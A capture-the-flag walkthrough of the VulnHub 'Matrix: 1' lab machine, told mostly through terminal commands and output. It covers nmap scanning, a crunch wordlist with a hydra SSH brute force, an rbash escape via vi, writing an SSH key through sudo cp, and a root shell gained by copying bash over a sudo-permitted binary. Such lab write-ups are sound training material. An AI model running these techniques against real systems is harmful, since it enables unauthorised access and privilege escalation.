# MATRIX: 1  
  
**URL: https://www.vulnhub.com/entry/matrix-1,259/**  
  
### NMAP

root@kali:\~# nmap -A 192.168.1.118  
>Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-04 16:56 UTC  
>Nmap scan report for porteus.home (192.168.1.118)  
>Host is up (0.00053s latency).  
>Not shown: 997 closed ports  
>PORT      STATE SERVICE VERSION  
>22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)  
>| ssh-hostkey:   
>|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)  
>|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)  
>|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)  
>80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)  
>|_http-server-header: SimpleHTTP/0.6 Python/2.7.14  
>|_http-title: Welcome in Matrix  
>31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)  
>|_http-server-header: SimpleHTTP/0.6 Python/2.7.14  
>|_http-title: Welcome in Matrix  
>MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)  
>Device type: general purpose  
>Running: Linux 3.X|4.X  
>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
>OS details: Linux 3.2 - 4.9  
>Network Distance: 1 hop  
>  
>TRACEROUTE  
>HOP RTT     ADDRESS  
>1   0.53 ms porteus.home (192.168.1.118)    
>  
>OS and Service detection performed. Please report any incorrect results at https://>nmap.org/submit/ .  
>Nmap done: 1 IP address (1 host up) scanned in 40.75 seconds  
  
### PORT 31337  
  
Here we find the same html that was running in the 80 port but with a few changes. If we look closely to the source code, we see a base64:  
>  
>ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=  
>  

That translates into the following text:  

>echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix  
  
The clue in the sentence is the filename. So we go to the hxxp://192.168.1.118:31337/Cypher.matrix  
>  
>+++++ ++++[ ->+++ +++++ +<]>+ +++++ ++.<+ +++[- >++++ <]>++ ++++. +++++  
>+.<++ +++++ ++[-> ----- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]> +++.-  
>...  
>  
  
Here we see what seems a brainfuck code.  
  
>   
>You can enter into matrix as guest, with password k1ll0rXX  
>  
>Note: Actually, I forget last two characters so I have replaced with XX try your  
>luck and find correct string of password.  
>  

### GUEST  
  
Well, that was easy. We just need to create a custom dictionary to retrieve the password:  

>    
>root@kali:\~# crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -t k1ll0r@@ -o pass.txt  
>Crunch will now generate the following amount of data: 34596 bytes  
>0 MB  
>0 GB  
>0 TB  
>0 PB  
>Crunch will now generate the following number of lines: 3844   
>  
>crunch: 100% completed generating output  
>  

And with our custom dictionary, we bruteforce the SSH with the guest user.  
  
>root@kali:\~# hydra -l guest -P pass.txt ssh://192.168.1.118  
>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret >service organizations, or for illegal purposes.  
>  
>Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-04 17:14:00  
>[WARNING] Many SSH configurations limit the number of parallel tasks, it is >recommended to reduce the tasks: use -t 4  
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 3844 login tries (l:1/p:3844), >\~241 tries per task  
>[DATA] attacking ssh://192.168.1.118:22/  
>[22][ssh] host: 192.168.1.118   login: guest   password: **k1ll0r7n**  
>1 of 1 target successfully completed, 1 valid password found  
>  
>Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-04 17:21:54  
  
Now, we have the guest credentials: k1ll0r7n. Let's log in:  
>  
>root@kali:\~# ssh -l guest 192.168.1.118  
>guest@192.168.1.118's password:   
>Last login: Sun Nov  4 17:24:05 2018 from 192.168.1.47  
>guest@porteus:\~$ id  
>-rbash: id: command not found  
>  

Cool, a restricted shell. Let's break out. First, we check what the environment looks like:
     
>guest@porteus:\~$ export  
>...  
>declare -rx PATH="/home/guest/prog"  
>declare -x PWD="/home/guest"  
>declare -rx SHELL="/bin/rbash"  
>...  
  
We have our PATH set to a specific folder, what tools do we have?  
  
>guest@porteus:\~$ /home/guest/prog/vi   
>.Xauthority    .cache/        .gksu.lock     Documents/     Public/  
>.bash_history  .config/       .local/        Downloads/     Videos/  
>.bash_profile  .dbus/         .ssh/          Music/         prog/  
>.bashrc        .esd_auth      Desktop/       Pictures/        

Just with the tab we see that vi is allowed. So It's pretty easy to break out, we can invoke a bash shell just with the following command:  

>vi -> :!/bin/bash  

Now we export our PATH to ease our game:  

>guest@porteus:\~$ declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:>/sbin:/bin"  
>guest@porteus:\~$ id  
>uid=1000(guest) gid=100(users) groups=100(users),7(lp),11(floppy),17(audio),18(video),19(cdrom),83(plugdev),84(power),86(netdev),93(scanner),997(sambashare)  
>  
Now we check what commands could we use as other users:  

>guest@porteus:/home/trinity$ sudo -l  
>User guest may run the following commands on porteus:  
>    (ALL) ALL  
>    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper  
>    (trinity) NOPASSWD: /bin/cp  

Well, the xfce4 file didn't exist, so let's log in as trinity to check what we could do.  
>  
>guest@porteus:\~$ /bin/echo "ssh-rsa AAAAB3...n6ymj root@kali" > test  
>guest@porteus:\~$ sudo -u trinity /bin/cp test /home/trinity/.ssh/authorized_keys  
>  
### TRINITY  

Nothing to explain here. Let's check again:  

>trinity@porteus:\~$ id  
>uid=1001(trinity) gid=1001(trinity) groups=1001(trinity)  
>trinity@porteus:\~$ sudo -l  
>User trinity may run the following commands on porteus:  
>    (root) NOPASSWD: /home/trinity/oracle  

### ROOT

Well, same routine and we are done:

>trinity@porteus:\~$ /bin/cp /bin/bash /home/trinity/oracle  
>  
>trinity@porteus:\~$ sudo -u root /home/trinity/oracle   
>root@porteus:/home/trinity# id  
>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)  
>root@porteus:/home/trinity# cd  
>root@porteus:\~# cat flag.txt   
>   _,-.                                                               
>,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE  
>|_,-O__\`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE  
>|\`-._\\`.__ \`_.           IN THE MATRIX AND BEAT OFF                   
>|\`-._\`-.\,-'_|  _,-'.                                                 
>     \`-.|.-' | |\`.-'|_     WHAT                                       
>        |      |_|,-'_\`.                                              
>              |-._,-'  |     NO, ME NEITHER                           
>         jrei | |    _,'                                              
>              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION      
>  

It was fun, but very easy to solve. Props to @unknowndevice64 for the VM.  